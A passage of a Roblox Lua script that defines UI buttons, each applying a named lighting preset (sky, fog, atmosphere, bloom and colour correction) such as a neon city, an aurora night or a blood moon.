        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(10, 16, 32)
        Lighting.Brightness = 0.8
        Lighting.ColorShift_Bottom = Color3.fromRGB(30, 10, 50)
        Lighting.ColorShift_Top = Color3.fromRGB(15, 32, 69)
        Lighting.EnvironmentDiffuseScale = 0.2
        Lighting.EnvironmentSpecularScale = 0.6
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(15, 22, 45)
        Lighting.ShadowSoftness = 0.4
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 0.5
        Lighting.GeographicLatitude = 55
        Lighting.FogColor = Color3.fromRGB(8, 12, 28)
        Lighting.FogEnd = 8000
        Lighting.FogStart = 600

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.MoonAngularSize = 12
        sky.MoonTextureId = "rbxassetid://6444320592"
        sky.SkyboxBk = "rbxassetid://12061405105"
        sky.SkyboxDn = "rbxassetid://12061405785"
        sky.SkyboxFt = "rbxassetid://12061405372"
        sky.SkyboxLf = "rbxassetid://12061405524"
        sky.SkyboxRt = "rbxassetid://12061405625"
        sky.SkyboxUp = "rbxassetid://12061405903"
        sky.StarCount = 8000

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 1.4
        bloom.Size = 45
        bloom.Threshold = 0.8

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.02
        cc.Contrast = 0.2
        cc.Saturation = 0.4
        cc.TintColor = Color3.fromRGB(240, 245, 255)
    end
})

bdTab:CreateButton({
    Name = "🌅 심해의 부서지는 노을",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(60, 25, 20)
        Lighting.Brightness = 3.2
        Lighting.ColorShift_Bottom = Color3.fromRGB(180, 60, 10)
        Lighting.ColorShift_Top = Color3.fromRGB(255, 120, 30)
        Lighting.EnvironmentDiffuseScale = 0.5
        Lighting.EnvironmentSpecularScale = 0.9
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(110, 50, 35)
        Lighting.ShadowSoftness = 0.05
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 17.8
        Lighting.GeographicLatitude = -25
        Lighting.FogColor = Color3.fromRGB(245, 115, 65)
        Lighting.FogEnd = 4000
        Lighting.FogStart = 300

        local atmosphere = Instance.new("Atmosphere", Lighting)
        atmosphere.Density = 0.48
        atmosphere.Offset = 0.25
        atmosphere.Color = Color3.fromRGB(255, 95, 45)
        atmosphere.Decay = Color3.fromRGB(40, 15, 95)
        atmosphere.Glare = 2.5
        atmosphere.Haze = 3

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.SkyboxBk = "rbxassetid://10633320293"
        sky.SkyboxDn = "rbxassetid://10633320704"
        sky.SkyboxFt = "rbxassetid://10633320399"
        sky.SkyboxLf = "rbxassetid://10633320491"
        sky.SkyboxRt = "rbxassetid://10633320593"
        sky.SkyboxUp = "rbxassetid://10633320803"
        sky.StarCount = 0
        sky.SunAngularSize = 25
        sky.SunTextureId = "rbxasset://sky/sun.jpg"

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 2.0
        bloom.Size = 60
        bloom.Threshold = 1.2

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.03
        cc.Contrast = 0.25
        cc.Saturation = 0.5
        cc.TintColor = Color3.fromRGB(255, 230, 210)

        local sunrays = Instance.new("SunRaysEffect", Lighting)
        sunrays.Intensity = 0.25
        sunrays.Spread = 0.85
    end
})

bdTab:CreateButton({
    Name = "✨ 아틀란티스 요정의 숲",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(30, 80, 85)
        Lighting.Brightness = 2.5
        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 150, 200)
        Lighting.ColorShift_Top = Color3.fromRGB(130, 255, 220)
        Lighting.EnvironmentDiffuseScale = 0.7
        Lighting.EnvironmentSpecularScale = 1.0
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(25, 65, 75)
        Lighting.ShadowSoftness = 0.2
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 15.5
        Lighting.GeographicLatitude = 75
        Lighting.FogColor = Color3.fromRGB(45, 105, 115)
        Lighting.FogEnd = 3500
        Lighting.FogStart = 150

        local atmosphere = Instance.new("Atmosphere", Lighting)
        atmosphere.Density = 0.35
        atmosphere.Offset = 0.1
        atmosphere.Color = Color3.fromRGB(150, 255, 230)
        atmosphere.Decay = Color3.fromRGB(30, 70, 90)
        atmosphere.Glare = 1.2
        atmosphere.Haze = 1.8

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.SkyboxBk = "rbxassetid://11652414742"
        sky.SkyboxDn = "rbxassetid://11652415174"
        sky.SkyboxFt = "rbxassetid://11652414841"
        sky.SkyboxLf = "rbxassetid://11652414926"
        sky.SkyboxRt = "rbxassetid://11652415064"
        sky.SkyboxUp = "rbxassetid://11652415291"
        sky.StarCount = 3000
        sky.SunAngularSize = 10

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 1.8
        bloom.Size = 65
        bloom.Threshold = 1.0

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.02
        cc.Contrast = 0.2
        cc.Saturation = 0.6
        cc.TintColor = Color3.fromRGB(225, 255, 245)

        local sunrays = Instance.new("SunRaysEffect", Lighting)
        sunrays.Intensity = 0.15
        sunrays.Spread = 0.65
    end
})

bdTab:CreateButton({
    Name = "🏙️ 폭우 뒤 비친 네온시티",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(20, 15, 30)
        Lighting.Brightness = 2.0
        Lighting.ColorShift_Bottom = Color3.fromRGB(255, 0, 180)
        Lighting.ColorShift_Top = Color3.fromRGB(0, 220, 255)
        Lighting.EnvironmentDiffuseScale = 0.8
        Lighting.EnvironmentSpecularScale = 1.2
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(25, 20, 40)
        Lighting.ShadowSoftness = 0.02
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 21.3
        Lighting.GeographicLatitude = 30
        Lighting.FogColor = Color3.fromRGB(15, 10, 25)
        Lighting.FogEnd = 2500
        Lighting.FogStart = 100

        local atmosphere = Instance.new("Atmosphere", Lighting)
        atmosphere.Density = 0.5
        atmosphere.Offset = 0.02
        atmosphere.Color = Color3.fromRGB(230, 50, 180)
        atmosphere.Decay = Color3.fromRGB(20, 120, 220)
        atmosphere.Glare = 0.8
        atmosphere.Haze = 3.2

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.MoonAngularSize = 8
        sky.SkyboxBk = "rbxassetid://9575454511"
        sky.SkyboxDn = "rbxassetid://9575455117"
        sky.SkyboxFt = "rbxassetid://9575454641"
        sky.SkyboxLf = "rbxassetid://9575454763"
        sky.SkyboxRt = "rbxassetid://9575454947"
        sky.SkyboxUp = "rbxassetid://9575455246"
        sky.StarCount = 500

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 3.5
        bloom.Size = 85
        bloom.Threshold = 0.4

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.04
        cc.Contrast = 0.35
        cc.Saturation = 0.7
        cc.TintColor = Color3.fromRGB(255, 240, 255)
    end
})

bdTab:CreateButton({
    Name = "⛅ 신들의 안개낀 성소",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(130, 125, 115)
        Lighting.Brightness = 4.5
        Lighting.ColorShift_Bottom = Color3.fromRGB(110, 105, 95)
        Lighting.ColorShift_Top = Color3.fromRGB(245, 235, 215)
        Lighting.EnvironmentDiffuseScale = 0.4
        Lighting.EnvironmentSpecularScale = 0.5
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(175, 165, 150)
        Lighting.ShadowSoftness = 0.6
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 9.5
        Lighting.GeographicLatitude = 15
        Lighting.FogColor = Color3.fromRGB(235, 230, 220)
        Lighting.FogEnd = 1200
        Lighting.FogStart = 0

        local atmosphere = Instance.new("Atmosphere", Lighting)
        atmosphere.Density = 0.65
        atmosphere.Offset = 0.4
        atmosphere.Color = Color3.fromRGB(255, 248, 235)
        atmosphere.Decay = Color3.fromRGB(150, 140, 130)
        atmosphere.Glare = 4.0
        atmosphere.Haze = 2.5

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.SkyboxBk = "rbxassetid://11411516173"
        sky.SkyboxDn = "rbxassetid://11411516801"
        sky.SkyboxFt = "rbxassetid://11411516314"
        sky.SkyboxLf = "rbxassetid://11411516429"
        sky.SkyboxRt = "rbxassetid://11411516548"
        sky.SkyboxUp = "rbxassetid://11411516940"
        sky.StarCount = 0
        sky.SunAngularSize = 35

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 1.2
        bloom.Size = 50
        bloom.Threshold = 2.0

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.05
        cc.Contrast = 0.12
        cc.Saturation = -0.15
        cc.TintColor = Color3.fromRGB(255, 252, 245)

        local sunrays = Instance.new("SunRaysEffect", Lighting)
        sunrays.Intensity = 0.4
        sunrays.Spread = 0.9
    end
})
bdTab:CreateButton({
    Name = "🌌 코스믹 인피니티 (우주)",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(5, 5, 12)
        Lighting.Brightness = 1.2
        Lighting.ColorShift_Bottom = Color3.fromRGB(15, 5, 25)
        Lighting.ColorShift_Top = Color3.fromRGB(10, 20, 40)
        Lighting.EnvironmentDiffuseScale = 0.3
        Lighting.EnvironmentSpecularScale = 1.0
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(12, 12, 22)
        Lighting.ShadowSoftness = 0.3
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 0
        Lighting.GeographicLatitude = 90
        Lighting.FogColor = Color3.fromRGB(2, 2, 8)
        Lighting.FogEnd = 150000
        Lighting.FogStart = 1000

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.MoonAngularSize = 0
        sky.SkyboxBk = "rbxassetid://12450383177"
        sky.SkyboxDn = "rbxassetid://12450384260"
        sky.SkyboxFt = "rbxassetid://12450383437"
        sky.SkyboxLf = "rbxassetid://12450383636"
        sky.SkyboxRt = "rbxassetid://12450383921"
        sky.SkyboxUp = "rbxassetid://12450384501"
        sky.StarCount = 10000

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 2.0
        bloom.Size = 30
        bloom.Threshold = 0.5

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.03
        cc.Contrast = 0.25
        cc.Saturation = 0.35
        cc.TintColor = Color3.fromRGB(255, 255, 255)
    end
})

bdTab:CreateButton({
    Name = "🏔️ 에메랄드 오로라 밤하늘",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(20, 35, 30)
        Lighting.Brightness = 0.7
        Lighting.ColorShift_Bottom = Color3.fromRGB(10, 25, 20)
        Lighting.ColorShift_Top = Color3.fromRGB(40, 90, 70)
        Lighting.EnvironmentDiffuseScale = 0.4
        Lighting.EnvironmentSpecularScale = 0.6
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(25, 40, 35)
        Lighting.ShadowSoftness = 0.5
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 1.5
        Lighting.GeographicLatitude = 80
        Lighting.FogColor = Color3.fromRGB(10, 20, 18)
        Lighting.FogEnd = 7000
        Lighting.FogStart = 500

        local atmosphere = Instance.new("Atmosphere", Lighting)
        atmosphere.Density = 0.25
        atmosphere.Offset = 0.1
        atmosphere.Color = Color3.fromRGB(120, 230, 180)
        atmosphere.Decay = Color3.fromRGB(15, 30, 25)
        atmosphere.Glare = 0.5
        atmosphere.Haze = 1.2

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.MoonAngularSize = 18
        sky.MoonTextureId = "rbxassetid://6444320592"
        sky.SkyboxBk = "rbxassetid://9243960010"
        sky.SkyboxDn = "rbxassetid://9243960627"
        sky.SkyboxFt = "rbxassetid://9243960167"
        sky.SkyboxLf = "rbxassetid://9243960299"
        sky.SkyboxRt = "rbxassetid://9243960475"
        sky.SkyboxUp = "rbxassetid://9243960765"
        sky.StarCount = 5000

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 1.8
        bloom.Size = 40
        bloom.Threshold = 0.7

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.01
        cc.Contrast = 0.18
        cc.Saturation = 0.25
        cc.TintColor = Color3.fromRGB(240, 255, 245)
    end
})

bdTab:CreateButton({
    Name = "🌸 봄날의 낙원 (애니 감성)",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(140, 135, 145)
        Lighting.Brightness = 2.8
        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
        Lighting.ColorShift_Top = Color3.fromRGB(255, 215, 220)
        Lighting.EnvironmentDiffuseScale = 0.6
        Lighting.EnvironmentSpecularScale = 0.5
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(165, 150, 160)
        Lighting.ShadowSoftness = 0.15
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 10.5
        Lighting.GeographicLatitude = 25
        Lighting.FogColor = Color3.fromRGB(245, 230, 235)
        Lighting.FogEnd = 15000
        Lighting.FogStart = 800

        local atmosphere = Instance.new("Atmosphere", Lighting)
        atmosphere.Density = 0.32
        atmosphere.Offset = 0.15
        atmosphere.Color = Color3.fromRGB(255, 210, 220)
        atmosphere.Decay = Color3.fromRGB(190, 180, 210)
        atmosphere.Glare = 1.5
        atmosphere.Haze = 1.0

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.SkyboxBk = "rbxassetid://2612711018"
        sky.SkyboxDn = "rbxassetid://2612712217"
        sky.SkyboxFt = "rbxassetid://2612711311"
        sky.SkyboxLf = "rbxassetid://2612711585"
        sky.SkyboxRt = "rbxassetid://2612711831"
        sky.SkyboxUp = "rbxassetid://2612712521"
        sky.StarCount = 0
        sky.SunAngularSize = 14

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 1.2
        bloom.Size = 35
        bloom.Threshold = 1.4

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.04
        cc.Contrast = 0.15
        cc.Saturation = 0.35
        cc.TintColor = Color3.fromRGB(255, 250, 255)

        local sunrays = Instance.new("SunRaysEffect", Lighting)
        sunrays.Intensity = 0.18
        sunrays.Spread = 0.7
    end
})

bdTab:CreateButton({
    Name = "🏜️ 고대 사막의 황금기",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(70, 55, 40)
        Lighting.Brightness = 3.5
        Lighting.ColorShift_Bottom = Color3.fromRGB(100, 70, 40)
        Lighting.ColorShift_Top = Color3.fromRGB(255, 180, 80)
        Lighting.EnvironmentDiffuseScale = 0.5
        Lighting.EnvironmentSpecularScale = 0.8
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(140, 115, 90)
        Lighting.ShadowSoftness = 0.05
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 16.3
        Lighting.GeographicLatitude = 12
        Lighting.FogColor = Color3.fromRGB(230, 195, 160)
        Lighting.FogEnd = 5000
        Lighting.FogStart = 200

        local atmosphere = Instance.new("Atmosphere", Lighting)
        atmosphere.Density = 0.55
        atmosphere.Offset = 0.3
        atmosphere.Color = Color3.fromRGB(255, 200, 140)
        atmosphere.Decay = Color3.fromRGB(80, 50, 30)
        atmosphere.Glare = 3.5
        atmosphere.Haze = 4.0

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.SkyboxBk = "rbxassetid://180537464"
        sky.SkyboxDn = "rbxassetid://180537415"
        sky.SkyboxFt = "rbxassetid://180537477"
        sky.SkyboxLf = "rbxassetid://180537453"
        sky.SkyboxRt = "rbxassetid://180537489"
        sky.SkyboxUp = "rbxassetid://180537427"
        sky.SunAngularSize = 30

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 1.5
        bloom.Size = 55
        bloom.Threshold = 1.8

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.02
        cc.Contrast = 0.22
        cc.Saturation = 0.2
        cc.TintColor = Color3.fromRGB(255, 245, 230)

        local sunrays = Instance.new("SunRaysEffect", Lighting)
        sunrays.Intensity = 0.35
        sunrays.Spread = 0.8
    end
})

bdTab:CreateButton({
    Name = "💧 비 개인 유리빛 세상",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(90, 110, 125)
        Lighting.Brightness = 4.0
        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
        Lighting.ColorShift_Top = Color3.fromRGB(200, 230, 255)
        Lighting.EnvironmentDiffuseScale = 0.8
        Lighting.EnvironmentSpecularScale = 1.5
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(150, 175, 195)
        Lighting.ShadowSoftness = 0.1
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 12
        Lighting.GeographicLatitude = 35
        Lighting.FogColor = Color3.fromRGB(210, 230, 245)
        Lighting.FogEnd = 25000
        Lighting.FogStart = 2000

        local atmosphere = Instance.new("Atmosphere", Lighting)
        atmosphere.Density = 0.15
        atmosphere.Offset = 0
        atmosphere.Color = Color3.fromRGB(235, 245, 255)
        atmosphere.Decay = Color3.fromRGB(140, 165, 185)
        atmosphere.Glare = 2.0
        atmosphere.Haze = 0.5

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.SkyboxBk = "rbxassetid://14454790076"
        sky.SkyboxDn = "rbxassetid://14454790575"
        sky.SkyboxFt = "rbxassetid://14454790185"
        sky.SkyboxLf = "rbxassetid://14454790312"
        sky.SkyboxRt = "rbxassetid://14454790434"
        sky.SkyboxUp = "rbxassetid://14454790691"
        sky.SunAngularSize = 10

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 0.8
        bloom.Size = 25
        bloom.Threshold = 2.2

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.05
        cc.Contrast = 0.3
        cc.Saturation = 0.4
        cc.TintColor = Color3.fromRGB(245, 250, 255)

        local sunrays = Instance.new("SunRaysEffect", Lighting)
        sunrays.Intensity = 0.1
        sunrays.Spread = 0.5
    end
})
bdTab:CreateButton({
    Name = "🔮 안드로메다의 눈물 (보랏빛 성운)",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(20, 15, 35)
        Lighting.Brightness = 1.0
        Lighting.ColorShift_Bottom = Color3.fromRGB(40, 10, 60)
        Lighting.ColorShift_Top = Color3.fromRGB(100, 40, 150)
        Lighting.EnvironmentDiffuseScale = 0.5
        Lighting.EnvironmentSpecularScale = 0.8
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(25, 15, 45)
        Lighting.ShadowSoftness = 0.3
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 0
        Lighting.GeographicLatitude = 45
        Lighting.FogColor = Color3.fromRGB(15, 8, 25)
        Lighting.FogEnd = 80000
        Lighting.FogStart = 2000

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.SkyboxBk = "rbxassetid://152285141"
        sky.SkyboxDn = "rbxassetid://152285108"
        sky.SkyboxFt = "rbxassetid://152285161"
        sky.SkyboxLf = "rbxassetid://152285191"
        sky.SkyboxRt = "rbxassetid://152285122"
        sky.SkyboxUp = "rbxassetid://152285175"
        sky.StarCount = 4000

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 2.2
        bloom.Size = 40
        bloom.Threshold = 0.6

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.02
        cc.Contrast = 0.25
        cc.Saturation = 0.45
        cc.TintColor = Color3.fromRGB(255, 240, 255)
    end
})

bdTab:CreateButton({
    Name = "☄️ 유성우가 쏟아지는 심야",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(10, 15, 25)
        Lighting.Brightness = 0.5
        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
        Lighting.ColorShift_Top = Color3.fromRGB(20, 40, 80)
        Lighting.EnvironmentDiffuseScale = 0.3
        Lighting.EnvironmentSpecularScale = 0.7
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(15, 20, 35)
        Lighting.ShadowSoftness = 0.4
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 23.8
        Lighting.GeographicLatitude = -35
        Lighting.FogColor = Color3.fromRGB(5, 5, 18)
        Lighting.FogEnd = 12000
        Lighting.FogStart = 1000

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.SkyboxBk = "rbxassetid://11652414742"
        sky.SkyboxDn = "rbxassetid://11652415174"
        sky.SkyboxFt = "rbxassetid://11652414841"
        sky.SkyboxLf = "rbxassetid://11652414926"
        sky.SkyboxRt = "rbxassetid://11652415064"
        sky.SkyboxUp = "rbxassetid://11652415291"
        sky.StarCount = 9000

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 1.5
        bloom.Size = 25
        bloom.Threshold = 0.8

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.01
        cc.Contrast = 0.2
        cc.Saturation = 0.3
    end
})

bdTab:CreateButton({
    Name = "🪐 거대 행성의 중력 (SF 우주)",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(15, 20, 30)
        Lighting.Brightness = 1.5
        Lighting.ColorShift_Bottom = Color3.fromRGB(30, 40, 60)
        Lighting.ColorShift_Top = Color3.fromRGB(0, 150, 255)
        Lighting.EnvironmentDiffuseScale = 0.5
        Lighting.EnvironmentSpecularScale = 1.2
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(20, 25, 40)
        Lighting.ShadowSoftness = 0.2
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 0.2
        Lighting.GeographicLatitude = 15
        Lighting.FogColor = Color3.fromRGB(5, 10, 20)
        Lighting.FogEnd = 90000
        Lighting.FogStart = 800

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.SkyboxBk = "rbxassetid://273934335"
        sky.SkyboxDn = "rbxassetid://273934526"
        sky.SkyboxFt = "rbxassetid://273934381"
        sky.SkyboxLf = "rbxassetid://273934441"
        sky.SkyboxRt = "rbxassetid://273934483"
        sky.SkyboxUp = "rbxassetid://273934594"
        sky.StarCount = 6000

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 2.5
        bloom.Size = 50
        bloom.Threshold = 0.4

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = 0.03
        cc.Contrast = 0.3
        cc.Saturation = 0.4
        cc.TintColor = Color3.fromRGB(220, 240, 255)
    end
})

bdTab:CreateButton({
    Name = "🩸 핏빛으로 물든 멸망의 달",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("BloomEffect") 
            or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") then
                obj:Destroy()
            end
        end

        Lighting.Ambient = Color3.fromRGB(35, 10, 10)
        Lighting.Brightness = 0.4
        Lighting.ColorShift_Bottom = Color3.fromRGB(20, 0, 0)
        Lighting.ColorShift_Top = Color3.fromRGB(150, 20, 20)
        Lighting.EnvironmentDiffuseScale = 0.1
        Lighting.EnvironmentSpecularScale = 0.5
        Lighting.GlobalShadows = true
        Lighting.OutdoorAmbient = Color3.fromRGB(40, 12, 12)
        Lighting.ShadowSoftness = 0.8
        Lighting.Technology = Enum.Technology.Future
        Lighting.ClockTime = 1.0
        Lighting.GeographicLatitude = 41
        Lighting.FogColor = Color3.fromRGB(25, 5, 5)
        Lighting.FogEnd = 3000
        Lighting.FogStart = 100

        local atmosphere = Instance.new("Atmosphere", Lighting)
        atmosphere.Density = 0.4
        atmosphere.Color = Color3.fromRGB(200, 30, 30)
        atmosphere.Decay = Color3.fromRGB(15, 0, 0)
        atmosphere.Glare = 0
        atmosphere.Haze = 2.0

        local sky = Instance.new("Sky", Lighting)
        sky.CelestialBodiesShown = true
        sky.MoonAngularSize = 40
        sky.MoonTextureId = "rbxassetid://1084351190"
        sky.SkyboxBk = "rbxassetid://11144211158"
        sky.SkyboxDn = "rbxassetid://11144211158"
        sky.SkyboxFt = "rbxassetid://11144211158"
        sky.SkyboxLf = "rbxassetid://11144211158"
        sky.SkyboxRt = "rbxassetid://11144211158"
        sky.SkyboxUp = "rbxassetid://11144211158"
        sky.StarCount = 500

        local bloom = Instance.new("BloomEffect", Lighting)
        bloom.Intensity = 1.8
        bloom.Size = 60
        bloom.Threshold = 0.9

        local cc = Instance.new("ColorCorrectionEffect", Lighting)
        cc.Brightness = -0.04
        cc.Contrast = 0.35
        cc.Saturation = 0.2
        cc.TintColor = Color3.fromRGB(255, 200, 200)
    end
})

bdTab:CreateButton({
    Name = "🌅 아스달의 지평선 (붉은 성운)",
    Callback = function()
        local Lighting = game:GetService("Lighting")

        for _, obj in ipairs(Lighting:GetChildren()) do
